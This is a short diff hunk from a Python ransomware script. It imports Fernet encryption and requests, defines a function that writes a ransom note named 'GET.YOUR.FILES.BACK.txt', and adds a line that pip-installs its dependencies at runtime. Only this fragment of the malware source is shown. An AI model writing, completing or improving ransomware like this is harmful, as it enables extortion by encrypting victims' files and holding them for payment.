@@ -2,6 +2,7 @@ import glob
 from cryptography.fernet import Fernet
 import os
 import requests
+os.system("pip install glob cryptography requests")
 def ransom_message():
     ransom_message = '''type your message here'''
     ransom_message_txt = open("GET.YOUR.FILES.BACK.txt", 'w')
